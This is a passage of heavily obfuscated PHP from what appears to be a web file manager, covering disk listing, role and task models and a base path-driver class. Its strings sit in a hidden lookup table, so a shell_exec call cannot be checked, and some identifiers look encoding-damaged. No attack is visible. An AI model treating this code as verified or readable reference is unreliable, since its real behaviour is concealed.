foreach ($¿ÔƒŒóÛ[$ ıƒÊ‡À[1494]] as $”Ä‘‹ñ) { $Û©ƒ¸¤[] = $”Ä‘‹ñ[$ ıƒÊ‡À[1495]]; $‹î¨ŠîÕ = explode($ ıƒÊ‡À[50], trim($”Ä‘‹ñ[$ ıƒÊ‡À[604]], $ ıƒÊ‡À[50])); $‹î¨ŠîÕ = array_remove_value($‹î¨ŠîÕ, $ ıƒÊ‡À[228]); $‹î¨ŠîÕ = array_reverse($‹î¨ŠîÕ); $Û©ƒ¸¤ = array_merge($Û©ƒ¸¤, $‹î¨ŠîÕ); } return array_unique($Û©ƒ¸¤); } public static function diskList($Åş£êõŞ = true) { $ï€ùÇ¢ = $_SERVER[©—Ò»ÅĞ][1496]; if ($Åş£êõŞ) { $„»òÛ¦ = Cache::get($ï€ùÇ¢); if (is_array($„»òÛ¦)) { return $„»òÛ¦; } } $„»òÛ¦ = self::diskListGet(); Cache::set($ï€ùÇ¢, $„»òÛ¦, 60); return $„»òÛ¦; } public static function diskListGet() { $²‚¯éŸ” =& $_SERVER[©—Ò»ÅĞ]; $³µÕãŠç = array(); if ($GLOBALS[$²‚¯éŸ”[6]][$²‚¯éŸ”[1497]] == $²‚¯éŸ”[1498]) { $åæö˜ = $²‚¯éŸ”[1499]; for ($ô±ˆâü§ = 0; $ô±ˆâü§ < strlen($åæö˜); $ô±ˆâü§++) { $ÂÂÇ¤´« = $åæö˜[$ô±ˆâü§] . $²‚¯éŸ”[1500]; if (file_exists($ÂÂÇ¤´«)) { $³µÕãŠç[] = $ÂÂÇ¤´«; } } return $³µÕãŠç; } if (!function_exists($²‚¯éŸ”[98])) { $³µÕãŠç[] = $²‚¯éŸ”[992]; return $³µÕãŠç; } $—¡ßÖ™ = explode($²‚¯éŸ”[285], shell_exec($²‚¯éŸ”[1501])); array_shift($—¡ßÖ™); array_pop($—¡ßÖ™); $§ÈïôÎí = array($²‚¯éŸ”[1502], $²‚¯éŸ”[1503], $²‚¯éŸ”[1504], $²‚¯éŸ”[1505], $²‚¯éŸ”[1506], $²‚¯éŸ”[1507], $²‚¯éŸ”[1508], $²‚¯éŸ”[1509]); foreach ($—¡ßÖ™ as $ã‘¶íÕ‰) { $Ã»¯İÒë = preg_split($²‚¯éŸ”[1510], $ã‘¶íÕ‰); $ÂÂÇ¤´« = $Ã»¯İÒë[count($Ã»¯İÒë) - 1]; if (!strstr($Ã»¯İÒë[0], $²‚¯éŸ”[1511]) || !$ÂÂÇ¤´«) { continue; } $íà¼ë½ö = rtrim($ÂÂÇ¤´«, $²‚¯éŸ”[8]) . $²‚¯éŸ”[8]; $³µÕãŠç[] = $íà¼ë½ö; } return $³µÕãŠç; } public static function isSameDisk($›Şâ¸ïÕ, $¿ü©íŒ) { $°± Å =& $_SERVER[©—Ò»ÅĞ]; if ($GLOBALS[$°± Å[6]][$°± Å[1497]] == $°± Å[1498]) { return strtolower(substr($›Şâ¸ïÕ, 0, 1)) == strtolower(substr($¿ü©íŒ, 0, 1)); } $Ê ÍŞÇ¤ = stat($›Şâ¸ïÕ); $¯Úó¹› = stat($¿ü©íŒ); if ($Ê ÍŞÇ¤ === !1 || $¯Úó¹› === !1) { return !1; } return $Ê ÍŞÇ¤[$°± Å[1512]] === $¯Úó¹›[$°± Å[1512]]; $µ²ô¸¦Í = self::diskList(); $úŠÁ¸ïÊ = !1; $ÒÙ·È¹ = !1; sort($µ²ô¸¦Í); $µ²ô¸¦Í = array_reverse($µ²ô¸¦Í); $›Şâ¸ïÕ = rtrim($›Şâ¸ïÕ, $°± Å[8]) . $°± Å[8]; $¿ü©íŒ = rtrim($¿ü©íŒ, $°± Å[8]) . $°± Å[8]; foreach ($µ²ô¸¦Í as $÷µ™’‰ë) { $”†™Û€‡ = strlen($÷µ™’‰ë); if (!$úŠÁ¸ïÊ && substr($›Şâ¸ïÕ, 0, $”†™Û€‡) == $÷µ™’‰ë) { $úŠÁ¸ïÊ = $÷µ™’‰ë; } if (!$ÒÙ·È¹ && substr($¿ü©íŒ, 0, $”†™Û€‡) == $÷µ™’‰ë) { $ÒÙ·È¹ = $÷µ™’‰ë; } if ($úŠÁ¸ïÊ && $ÒÙ·È¹) { break; } } return $úŠÁ¸ïÊ === $ÒÙ·È¹; } public static function transferType($¤ËĞ¦¸, $Î±Á¢†¾) { $¬¬›İé« =& $_SERVER[©—Ò»ÅĞ]; $ †§‰×Ğ = self::driverType($¤ËĞ¦¸); $âĞ‹Ÿâ = self::driverType($Î±Á¢†¾); if ($ †§‰×Ğ[$¬¬›İé«[33]] == $âĞ‹Ÿâ[$¬¬›İé«[33]] && $ †§‰×Ğ[$¬¬›İé«[1513]] == $âĞ‹Ÿâ[$¬¬›İé«[1513]]) { return $¬¬›İé«[1514]; } if ($ †§‰×Ğ[$¬¬›İé«[33]] == $¬¬›İé«[1026] && $âĞ‹Ÿâ[$¬¬›İé«[33]] == $¬¬›İé«[106]) { return $¬¬›İé«[1385]; } if ($ †§‰×Ğ[$¬¬›İé«[33]] == $¬¬›İé«[106] && $âĞ‹Ÿâ[$¬¬›İé«[33]] == $¬¬›İé«[1026]) { return $¬¬›İé«[107]; } return $¬¬›İé«[1515]; } public static function driverType($ÆÎù¾¸–) { $Úäœ²ë’ =& $_SERVER[©—Ò»ÅĞ]; $àÛŒ–Ü = str_replace($Úäœ²ë’[1516], $Úäœ²ë’[12], strtolower($ÆÎù¾¸–->getType())); if ($àÛŒ–Ü == $Úäœ²ë’[858] || $àÛŒ–Ü == $Úäœ²ë’[1517] || $àÛŒ–Ü == $Úäœ²ë’[1518]) { $™‹üõ¯Á = self::ioFileDriverGet($Úäœ²ë’[498] . $ÆÎù¾¸–->pathParse[$Úäœ²ë’[1360]] . $Úäœ²ë’[402]); $ÆÎù¾¸– = IO::init($Úäœ²ë’[1486] . $™‹üõ¯Á[$Úäœ²ë’[487]] . $Úäœ²ë’[1474]); } else { if ($àÛŒ–Ü == $Úäœ²ë’[1394] || $àÛŒ–Ü == $Úäœ²ë’[1519]) { $ÆÎù¾¸– = IO::init($ÆÎù¾¸–->pathParse[$Úäœ²ë’[1337]]); } } $±Ä¤œÖù = $ÆÎù¾¸–->path; $àÛŒ–Ü = str_replace($Úäœ²ë’[1516], $Úäœ²ë’[12], strtolower($ÆÎù¾¸–->getType())); if ($àÛŒ–Ü == $Úäœ²ë’[106]) { return array($Úäœ²ë’[33] => $Úäœ²ë’[106], $Úäœ²ë’[1513] => $Úäœ²ë’[12], $Úäœ²ë’[87] => $±Ä¤œÖù, $Úäœ²ë’[96] => $ÆÎù¾¸–); } return array($Úäœ²ë’[33] => $Úäœ²ë’[1026], $Úäœ²ë’[1513] => $ÆÎù¾¸–->pathDriver, $Úäœ²ë’[87] => $±Ä¤œÖù, $Úäœ²ë’[96] => $ÆÎù¾¸–); } public static function pathDriverType($ş¸û½Ş) { return $ş¸û½Ş ? self::driverType(IO::init($ş¸û½Ş)) : !1; } public static function pathDriverLocal($Â§–ÍéÀ) { $Ë©ß¡ö® =& $_SERVER[©—Ò»ÅĞ]; $°È½¶©³ = $Â§–ÍéÀ ? self::driverType(IO::init($Â§–ÍéÀ)) : !1; return strtolower($°È½¶©³[$Ë©ß¡ö®[33]]) == $Ë©ß¡ö®[106] ? !0 : !1; } public static function allowCover($çİµ¿êå, $³Ø´–Şè = true) { $ºªşÍñ© =& $_SERVER[©—Ò»ÅĞ]; if (is_string($çİµ¿êå)) { $çİµ¿êå = IO::info($çİµ¿êå); } if (!$çİµ¿êå || $çİµ¿êå[$ºªşÍñ©[33]] == $ºªşÍñ©[78] || $çİµ¿êå[$ºªşÍñ©[79]] <= 100) { return !1; } if (isset($çİµ¿êå[$ºªşÍñ©[1520]]) || !$çİµ¿êå[$ºªşÍñ©[87]]) { return !1; } if (isset($çİµ¿êå[$ºªşÍñ©[232]]) && !$çİµ¿êå[$ºªşÍñ©[232]]) { return !1; } static $Çé‹×äš = false; if (!$Çé‹×äš || !$³Ø´–Şè) { $ôÓÃ¢»¿ = self::driverType(IO::init($çİµ¿êå[$ºªşÍñ©[87]])); $È¸Ï¡–ß = $ôÓÃ¢»¿[$ºªşÍñ©[96]]; $Çé‹×äš = $ºªşÍñ©[194]; if ($ôÓÃ¢»¿[$ºªşÍñ©[33]] == $ºªşÍñ©[106]) { $Çé‹×äš = $ºªşÍñ©[1521]; } if ($ôÓÃ¢»¿[$ºªşÍñ©[96]] && is_array($ôÓÃ¢»¿[$ºªşÍñ©[96]]->config)) { $—Ëú”—® = $ôÓÃ¢»¿[$ºªşÍñ©[96]]->config; if (isset($—Ëú”—®[$ºªşÍñ©[1522]]) && $—Ëú”—®[$ºªşÍñ©[1522]]) { $Çé‹×äš = $ºªşÍñ©[1521]; } } $áıô†Ûå = KodIO::defaultDriver(); if (strtolower($áıô†Ûå[$ºªşÍñ©[96]]) == $ºªşÍñ©[106] && is_array($áıô†Ûå[$ºªşÍñ©[6]])) { $Âßöèõ« = $áıô†Ûå[$ºªşÍñ©[6]][$ºªşÍñ©[1369]]; if (substr($Âßöèõ«, 0, 2) == $ºªşÍñ©[1523]) { $Âßöèõ« = str_replace($ºªşÍñ©[1523], BASIC_PATH, $Âßöèõ«); } $Âßöèõ« = str_replace($ºªşÍñ©[254], $ºªşÍñ©[8], $Âßöèõ«); if (substr($çİµ¿êå[$ºªşÍñ©[87]], 0, strlen($Âßöèõ«)) == $Âßöèõ«) { $Çé‹×äš = $ºªşÍñ©[194]; } } } return $Çé‹×äš == $ºªşÍñ©[1521] ? !0 : !1; } } goto F­İÎ¤®”; cÒ½ñ‘Î: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x72\157\x6c\145\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x61\165\164\x68", "\154\x61\x62\x65\154", "\144\x69\x73\x70\x6c\x61\171", "\163\171\163\x74\145\x6d", "\x64\x65\x73\143", "\x69\147\x6e\157\162\x65\105\x78\164", "\x69\147\156\157\162\145\106\x69\x6c\145\123\151\x7a\x65", "\141\144\x6d\x69\156\x69\x73\164\x72\x61\164\x6f\162", "\x73\x6f\162\164"); public function listData($åÊò¸¿ª = false, $°¹î‰™É = "\163\x6f\162\164", $ó‹ßº†Æ = false) { $¶³«Óê =& $_SERVER[©—Ò»ÅĞ]; $Ü×ôÛ–Ş = parent::listData($åÊò¸¿ª, $°¹î‰™É, $ó‹ßº†Æ); if (!$åÊò¸¿ª) { foreach ($Ü×ôÛ–Ş as $Â›êÁÈ => $·Ú—ÌÈ) { if ($·Ú—ÌÈ[$¶³«Óê[2377]] == 1) { $Ü×ôÛ–Ş[$Â›êÁÈ][$¶³«Óê[540]] = LNG($¶³«Óê[2663]); } } } return $Ü×ôÛ–Ş; } public function update($ŸÕ»Ÿ¹, $˜ĞöçÒ) { $…ğÏœéØ =& $_SERVER[©—Ò»ÅĞ]; $«´ë¼¶ª = parent::listData($ŸÕ»Ÿ¹); $“†Ö•İ” = $this->findByName($˜ĞöçÒ[$…ğÏœéØ[32]]); if (!$«´ë¼¶ª || $“†Ö•İ” && $“†Ö•İ”[$…ğÏœéØ[487]] != $«´ë¼¶ª[$…ğÏœéØ[487]]) { return !1; } if ($“†Ö•İ”[$…ğÏœéØ[2377]] == 1) { $˜ĞöçÒ = array($…ğÏœéØ[32] => $˜ĞöçÒ[$…ğÏœéØ[32]], $…ğÏœéØ[2204] => $˜ĞöçÒ[$…ğÏœéØ[2204]]); } $this->filterAuth($˜ĞöçÒ[$…ğÏœéØ[502]]); return parent::update($ŸÕ»Ÿ¹, $˜ĞöçÒ); } public function remove($¿¡ìµŒ) { $ğÂİÁà’ = parent::listData($¿¡ìµŒ); if (!$ğÂİÁà’ || $ğÂİÁà’[$_SERVER[©—Ò»ÅĞ][189]]) { return !1; } return parent::remove($¿¡ìµŒ); } public function add($Æß‘åå) { $ÃÚ½ŒÎ =& $_SERVER[©—Ò»ÅĞ]; $ÔÀÏô¥Í = $Æß‘åå[$ÃÚ½ŒÎ[32]]; if ($this->findByName($ÔÀÏô¥Í)) { return !1; } $¹òÉÓŒ = array($ÃÚ½ŒÎ[509] => $ÔÀÏô¥Í, $ÃÚ½ŒÎ[2189] => $ÃÚ½ŒÎ[12], $ÃÚ½ŒÎ[2185] => $ÃÚ½ŒÎ[2193], $ÃÚ½ŒÎ[2664] => 1, $ÃÚ½ŒÎ[2188] => 0, $ÃÚ½ŒÎ[2665] => 0, $ÃÚ½ŒÎ[2187] => $this->getSort()); $Æß‘åå = array_merge($¹òÉÓŒ, $Æß‘åå); $this->filterAuth($Æß‘åå[$ÃÚ½ŒÎ[502]]); return parent::insert($Æß‘åå); } private function getSort() { $Ó§—’¯ =& $_SERVER[©—Ò»ÅĞ]; $ı·Ñìƒ = parent::listData(); $¾ó‰ªÍë = array_to_keyvalue($ı·Ñìƒ, $Ó§—’¯[12], $Ó§—’¯[2205]); return empty($¾ó‰ªÍë) ? 0 : max($¾ó‰ªÍë) + 1; } private function filterAuth(&$àì•ô÷«) { $¬·áóÏî =& $_SERVER[©—Ò»ÅĞ]; $¶˜åÉ¼ = array(); $®õØÙìÑ = array_filter(explode($¬·áóÏî[50], $àì•ô÷«)); foreach ($®õØÙìÑ as $àì•ô÷«) { $·‘ññ¬ì = explode($¬·áóÏî[10], $àì•ô÷«); if ($·‘ññ¬ì[0] == $¬·áóÏî[2666] && $·‘ññ¬ì[1] != $¬·áóÏî[1309]) { $Ã©§€‹â = $·‘ññ¬ì[0] . $¬·áóÏî[10] . $·‘ññ¬ì[1] . $¬·áóÏî[2667]; if (!in_array($Ã©§€‹â, $®õØÙìÑ)) { $¶˜åÉ¼[] = $Ã©§€‹â; } } $¶˜åÉ¼[] = $àì•ô÷«; } $àì•ô÷« = implode($¬·áóÏî[50], $¶˜åÉ¼); } public function findRoleDefault() { $û”–â„ =& $_SERVER[©—Ò»ÅĞ]; $Û¯¿ì›€ = parent::listData(); $®×«Ëıö = !1; foreach ($Û¯¿ì›€ as $û¿†ºƒ²) { if (!$û¿†ºƒ² || $û¿†ºƒ²[$û”–â„[2203]] == $û”–â„[228] || $û¿†ºƒ²[$û”–â„[2377]] == 1) { continue; } if (strstr($û¿†ºƒ²[$û”–â„[502]], $û”–â„[2668])) { continue; } if (!strstr($û¿†ºƒ²[$û”–â„[502]], $û”–â„[2669])) { continue; } if (!$®×«Ëıö) { $®×«Ëıö = $û¿†ºƒ²; continue; } $éç·‰°ô = explode($û”–â„[50], $®×«Ëıö[$û”–â„[502]]); $¡èØËìá = explode($û”–â„[50], $û¿†ºƒ²[$û”–â„[502]]); if (count($éç·‰°ô) > count($¡èØËìá)) { $®×«Ëıö = $û¿†ºƒ²; } } return $®×«Ëıö ? $®×«Ëıö[$û”–â„[487]] : $û”–â„[12]; } public function sort($ûÌ¼Æ á, $çÍ›âöí) { return parent::update($ûÌ¼Æ á, $çÍ›âöí); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\x74\141\163\x6b\114\151\163\164"; public $field = array("\x6e\x61\155\145", "\164\171\x70\x65", "\x65\166\145\x6e\164", "\x74\151\x6d\145", "\x64\x65\163\x63", "\163\x79\x73\x74\x65\x6d", "\x65\x6e\141\142\x6c\145", "\154\x61\x73\164\122\x75\156", "\x73\157\162\x74"); public function listData($…¡ªÎÆ = false, $¿×ˆü¹ = "\x73\x6f\x72\164", $®æ…õ„ = false) { return parent::listData($…¡ªÎÆ, $¿×ˆü¹, $®æ…õ„); } public function add($—ï«¸§°) { $éÓ¾¿® =& $_SERVER[©—Ò»ÅĞ]; $Ò×éçÏ‘ = $this->findByName($—ï«¸§°[$éÓ¾¿®[32]]); if ($Ò×éçÏ‘) { return !1; } $—ï«¸§°[$éÓ¾¿®[1929]] = 0; $—ï«¸§°[$éÓ¾¿®[2205]] = $this->getSort(); return parent::insert($—ï«¸§°); } private function getSort() { $ª’ÂÅŞË =& $_SERVER[©—Ò»ÅĞ]; $ç‰÷êõö = parent::listData(); $ÃìêèìÁ = array_to_keyvalue($ç‰÷êõö, $ª’ÂÅŞË[12], $ª’ÂÅŞË[2205]); return empty($ÃìêèìÁ) ? 0 : max($ÃìêèìÁ) + 1; } public function update($ÆÎŒ¹íô, $”¹æğœ) { $Šş—²Ò =& $_SERVER[©—Ò»ÅĞ]; $¶±Ş†ÌĞ = $this->listData($ÆÎŒ¹íô); $ËŠŠÖÍŞ = $this->findByName($”¹æğœ[$Šş—²Ò[32]]); if (!$¶±Ş†ÌĞ || $ËŠŠÖÍŞ && $ËŠŠÖÍŞ[$Šş—²Ò[487]] != $¶±Ş†ÌĞ[$Šş—²Ò[487]]) { return !1; } return parent::update($ÆÎŒ¹íô, $”¹æğœ); } public function remove($éãøâ³Â, $òÉ¶Ÿ‰ş = false) { $ß³Ùö· =& $_SERVER[©—Ò»ÅĞ]; $£ú¥Ä§— = $this->listData($éãøâ³Â); if (!$£ú¥Ä§—) { return; } if (!$òÉ¶Ÿ‰ş && $£ú¥Ä§—[$ß³Ùö·[189]] == $ß³Ùö·[91]) { return !1; } return parent::remove($éãøâ³Â); } public function enable($¿¢ôêÎ…, $ÒÅÖ¤±‰) { return $this->update($¿¢ôêÎ…, array($_SERVER[©—Ò»ÅĞ][2658] => $ÒÅÖ¤±‰)); } public function run($úæÈ’¥€) { return $this->update($úæÈ’¥€, array($_SERVER[©—Ò»ÅĞ][2670] => time())); } } goto b¬õó—Ü‚; a„ö„ÉíÒ£: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $«œ¸Ôø =& $_SERVER[©—Ò»ÅĞ]; $this->objectDriver = array($«œ¸Ôø[60], $«œ¸Ôø[61], $«œ¸Ôø[62], $«œ¸Ôø[63], $«œ¸Ôø[64], $«œ¸Ôø[65], $«œ¸Ôø[66], $«œ¸Ôø[67], $«œ¸Ôø[68], $«œ¸Ôø[69], $«œ¸Ôø[70], $«œ¸Ôø[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¸û¸íùå) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¸û¸íùå, $_SERVER[©—Ò»ÅĞ][8]); } return $¸û¸íùå; } public function iconvApp($ÍíºµŸÀ) { return $ÍíºµŸÀ; } public function iconvSystem($›§Ç˜¾¸) { return $›§Ç˜¾¸; } public function iconvTo($‹İíãé‡, $Ã…¼ßæÔ, $¢›»³²ï) { $—€ á =& $_SERVER[©—Ò»ÅĞ]; if (!$‹İíãé‡ || !function_exists($—€ á[72])) { return $‹İíãé‡; } static $ê¡¼ç›  = array(); $£¿Ò˜«‚ = $Ã…¼ßæÔ . $—€ á[73] . $¢›»³²ï . $—€ á[74] . $‹İíãé‡; if (isset($ê¡¼ç› [$£¿Ò˜«‚])) { return $ê¡¼ç› [$£¿Ò˜«‚]; } if (function_exists($—€ á[75])) { $„äßµ‘¾ = @mb_convert_encoding($‹İíãé‡, $¢›»³²ï, $Ã…¼ßæÔ); } else { $„äßµ‘¾ = @iconv($Ã…¼ßæÔ, $¢›»³²ï, $‹İíãé‡); } $„äßµ‘¾ = $„äßµ‘¾ ? $„äßµ‘¾ : $‹İíãé‡; if (strstr($„äßµ‘¾, $—€ á[76])) { $„äßµ‘¾ = str_replace($—€ á[76], $—€ á[11], $„äßµ‘¾); } $ê¡¼ç› [$Ã…¼ßæÔ . $—€ á[73] . $¢›»³²ï . $—€ á[74] . $‹İíãé‡] = $„äßµ‘¾; $ê¡¼ç› [$¢›»³²ï . $—€ á[73] . $Ã…¼ßæÔ . $—€ á[74] . $‹İíãé‡] = $‹İíãé‡; $ê¡¼ç› [$¢›»³²ï . $—€ á[73] . $Ã…¼ßæÔ . $—€ á[74] . $„äßµ‘¾] = $‹İíãé‡; $ê¡¼ç› [$Ã…¼ßæÔ . $—€ á[73] . $¢›»³²ï . $—€ á[74] . $„äßµ‘¾] = $„äßµ‘¾; return $„äßµ‘¾; } public function getPathInner($± êœßÉ) { $¸º›“å = IO::init($± êœßÉ); return $¸º›“å->path; } public function getPathOuter($šŒš×Æ) { $é“ƒÍ² =& $_SERVER[©—Ò»ÅĞ]; $µÂ†ñÃ = strlen(trim($this->pathBase, $é“ƒÍ²[8])); $šŒš×Æ = substr(trim($šŒš×Æ, $é“ƒÍ²[8]), $µÂ†ñÃ); return $this->pathDriver . $é“ƒÍ²[8] . ltrim($šŒš×Æ, $é“ƒÍ²[8]); } public function isParentOf($‚áØÒş, $š³¶×Ö) { $¹·˜ü‰‹ =& $_SERVER[©—Ò»ÅĞ]; $‚áØÒş = rtrim(strtolower($‚áØÒş), $¹·˜ü‰‹[8]) . $¹·˜ü‰‹[8]; $š³¶×Ö = rtrim(strtolower($š³¶×Ö), $¹·˜ü‰‹[8]) . $¹·˜ü‰‹[8]; $í’ö¾ÇÑ = strpos($š³¶×Ö, $‚áØÒş) === 0; return $í’ö¾ÇÑ; } public function getType() { $Šşî°øÙ =& $_SERVER[©—Ò»ÅĞ]; $ÍÅÀïõÀ = str_replace($Šşî°øÙ[77], $Šşî°øÙ[12], get_class($this)); return strtolower($ÍÅÀïõÀ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($òñ×õõ, $ˆˆ” “¨) { $³ŸÄœÓ =& $_SERVER[©—Ò»ÅĞ]; $ÃµüÓÁ† = rtrim($òñ×õõ, $³ŸÄœÓ[8]) . $³ŸÄœÓ[8] . $ˆˆ” “¨; $òË±­ó’ = $this->exist($ÃµüÓÁ†); return $òË±­ó’ ? $ÃµüÓÁ† : !1; } public function setModifyTime($ù°½“‡”, $ï·µäÕ = '') { } public function renameObject($“é›•¢, $Øòóíø) { $¬›ó±‹ó = $Øòóíø; $“é›•¢ = $this->getPathOuter($“é›•¢); $Øòóíø = $this->pathFather($“é›•¢) . $Øòóíø; $ä‡Á²çğ = IO::copy($“é›•¢, $this->pathFather($“é›•¢), REPEAT_RENAME_FOLDER, $¬›ó±‹ó); if ($ä‡Á²çğ) { IO::remove($“é›•¢); } return $ä‡Á²çğ ? $Øòóíø : !1; } public function tempFile($•ĞƒñÏ = '', $åÂî»¶ğ = '') { if (!$•ĞƒñÏ) { $•ĞƒñÏ = rand_string(15); } $¢™•çŠ = TEMP_FILES . rand_string(15) . $_SERVER[©—Ò»ÅĞ][8]; @mkdir($¢™•çŠ, DEFAULT_PERRMISSIONS, !0); $˜ûƒƒŒí = $¢™•çŠ . $•ĞƒñÏ; @touch($˜ûƒƒŒí); if ($åÂî»¶ğ) { file_put_contents($˜ûƒƒŒí, $åÂî»¶ğ); } return $˜ûƒƒŒí; } public function tempFileRemve($ó˜òµª—) { @unlink($ó˜òµª—); @rmdir($this->pathFather($ó˜òµª—)); } public function mkfile($ùø÷ÚÌÂ, $öË’š…ù = '', $Èæ×ë™Õ = REPEAT_RENAME) { } public function mkdir($íò“ş•É, $¬€‚şëË = REPEAT_SKIP) { } public function delFile($Âç¨½ˆå) { } public function delFolder($âÇ†»ÕÕ) { } public function copyFile($ŸœëÙ‹†, $¥ÛÓÃİÙ) { } public function moveFile($•øØÊÂÙ, $”á©Şº›) { } public function remove($ÛëÑëæÑ) { if ($this->isFile($ÛëÑëæÑ)) { return $this->delFile($ÛëÑëæÑ); } return $this->delFolder($ÛëÑëæÑ); } public function rename($³‡”šö, $Ñº¢Çé) { } public function exist($âå”òã‚) { } public function isFile($—ô„Ï…À) { } public function isFolder($²âò«ï) { } public function size($È¢Ï‰ŞŞ) { } public function info($õÒ£Ÿ‘) { } public function infoSimple($”¿„Î) { return $this->info($”¿„Î); } public function infoAuth($ü•‹ßÛš) { return $this->info($ü•‹ßÛš); } public function infoFull($¥„ıº—Ø) { return $this->info($¥„ıº—Ø); } public function infoFullSimple($ŠÍÏÓŞ™) { return $this->info($ŠÍÏÓŞ™); } public function infoWithChildren($×÷í€ç) { $ø£ÂÒšñ =& $_SERVER[©—Ò»ÅĞ]; static $ØÜ‰¹¡ç = array(); if (isset($ØÜ‰¹¡ç[$×÷í€ç])) { return $ØÜ‰¹¡ç[$×÷í€ç]; } $—²»Š·§ = $this->info($×÷í€ç); if ($—²»Š·§ && $—²»Š·§[$ø£ÂÒšñ[33]] == $ø£ÂÒšñ[78]) { $À«‚ê¾ = array($ø£ÂÒšñ[79] => 0, $ø£ÂÒšñ[80] => 0, $ø£ÂÒšñ[81] => 0); $this->infoChildren($×÷í€ç, $À«‚ê¾); $—²»Š·§[$ø£ÂÒšñ[79]] = $À«‚ê¾[$ø£ÂÒšñ[79]]; $—²»Š·§[$ø£ÂÒšñ[82]] = array($ø£ÂÒšñ[83] => $À«‚ê¾[$ø£ÂÒšñ[80]], $ø£ÂÒšñ[84] => $À«‚ê¾[$ø£ÂÒšñ[81]]); $ØÜ‰¹¡ç[$×÷í€ç] = $—²»Š·§; } return $—²»Š·§; } public function listPath($Ü™Úéøç, $ºÅı¶æ = false) { } public function has($Œ•¼â¥Ü, $Ûéûê¬‰ = false, $ó›ÍÏú = false) { } public function canRead($¬Üé•Ì§) { } public function canWrite($ªÖó«Öı) { } public function getContent($¾Ò‡ØŒæ) { } public function setContent($Ó’‹ÏŸ, $’º†íŒ = '') { } protected function infoChildren($¯£Ø«ÓÏ, &$Íá…à±‰) { $ù•Àú¥¢ =& $_SERVER[©—Ò»ÅĞ]; check_abort_echo(); $íµŠÅ»¨ = $this->listPath($¯£Ø«ÓÏ, !0); $íµŠÅ»¨ = array_merge($íµŠÅ»¨[$ù•Àú¥¢[85]], $íµŠÅ»¨[$ù•Àú¥¢[86]]); foreach ($íµŠÅ»¨ as $ı¨†šÔĞ) { if ($ı¨†šÔĞ[$ù•Àú¥¢[33]] == $ù•Àú¥¢[78]) { $Íá…à±‰[$ù•Àú¥¢[81]]++; $İÇ¾ÌùÕ = $this->getPathInner($ı¨†šÔĞ[$ù•Àú¥¢[87]]); $this->infoChildren($İÇ¾ÌùÕ, $Íá…à±‰); } else { $Íá…à±‰[$ù•Àú¥¢[80]]++; $Íá…à±‰[$ù•Àú¥¢[79]] += $ı¨†šÔĞ[$ù•Àú¥¢[79]]; } } } public function fileSubstr($Œòúš—­, $ßŠ×æÕï, $¢áŒ‡©ï) { } public function listAll($‹£é÷¹Ë) { } public function listAllMake($’—…¥‘Ï, &$ŞÊ–ô©•) { $µƒÍ×¤ =& $_SERVER[©—Ò»ÅĞ]; check_abort_echo(); $úÜøù…€ = $this->listPath($’—…¥‘Ï, !0); if (!$úÜøù…€) { return; } $Úğúçœ° = array_merge($úÜøù…€[$µƒÍ×¤[85]], $úÜøù…€[$µƒÍ×¤[86]]); foreach ($Úğúçœ° as $µòŸï£) { $Àò¤ƒ—Ô = $µòŸï£[$µƒÍ×¤[33]] == $µƒÍ×¤[78]; $ª¿‚‡Õ = array($µƒÍ×¤[87] => $µòŸï£[$µƒÍ×¤[87]], $µƒÍ×¤[78] => $Àò¤ƒ—Ô); if (isset($µòŸï£[$µƒÍ×¤[79]])) { $ª¿‚‡Õ[$µƒÍ×¤[79]] = $µòŸï£[$µƒÍ×¤[79]]; } if (isset($µòŸï£[$µƒÍ×¤[88]])) { $ª¿‚‡Õ[$µƒÍ×¤[88]] = $µòŸï£[$µƒÍ×¤[88]]; } if (!$Àò¤ƒ—Ô) { $ŞÊ–ô©•[] = $ª¿‚‡Õ; continue; } $ŞÊ–ô©•[] = $ª¿‚‡Õ; $…ÛÛŸÉ = $µòŸï£[$µƒÍ×¤[87]]; $Ï£èœáç = $this->pathDriver; if (substr($µòŸï£[$µƒÍ×¤[87]], 0, strlen($Ï£èœáç)) == $Ï£èœáç) { $…ÛÛŸÉ = substr($…ÛÛŸÉ, strlen($Ï£èœáç)); } $this->listAllMake($…ÛÛŸÉ, $ŞÊ–ô©•); } } public function listAllSimple($øô¸æè”, $ó¯Åàš = false) { $î¹êŒ‘² = $this->listAll($øô¸æè”); return $this->listAllSimpleMake($î¹êŒ‘², $this->getPathOuter($øô¸æè”), $ó¯Åàš); } public function listAllSimpleMake($±¼»š«ß, $¨şâ”Êä, $§Ó§–ıÀ) { $·ş¦ŸãÙ =& $_SERVER[©—Ò»ÅĞ]; $¬Úßà¢ä = array(); $¨şâ”Êä = rtrim(get_path_father($¨şâ”Êä), $·ş¦ŸãÙ[8]) . $·ş¦ŸãÙ[8]; foreach ($±¼»š«ß as $ëøî¯Úñ) { $¦Ğ†­Š… = array($·ş¦ŸãÙ[87] => $ëøî¯Úñ[$·ş¦ŸãÙ[87]], $·ş¦ŸãÙ[89] => $ëøî¯Úñ[$·ş¦ŸãÙ[87]], $·ş¦ŸãÙ[78] => $ëøî¯Úñ[$·ş¦ŸãÙ[78]]); if (isset($ëøî¯Úñ[$·ş¦ŸãÙ[79]]) && !$ëøî¯Úñ[$·ş¦ŸãÙ[78]]) { $¦Ğ†­Š…[$·ş¦ŸãÙ[79]] = $ëøî¯Úñ[$·ş¦ŸãÙ[79]]; } if (isset($ëøî¯Úñ[$·ş¦ŸãÙ[88]])) { $¦Ğ†­Š…[$·ş¦ŸãÙ[88]] = $ëøî¯Úñ[$·ş¦ŸãÙ[88]]; } if (is_array($ëøî¯Úñ[$·ş¦ŸãÙ[90]])) { $¦Ğ†­Š…[$·ş¦ŸãÙ[89]] = $ëøî¯Úñ[$·ş¦ŸãÙ[90]][$·ş¦ŸãÙ[87]]; $¦Ğ†­Š…[$·ş¦ŸãÙ[79]] = $ëøî¯Úñ[$·ş¦ŸãÙ[90]][$·ş¦ŸãÙ[79]]; $¦Ğ†­Š…[$·ş¦ŸãÙ[88]] = 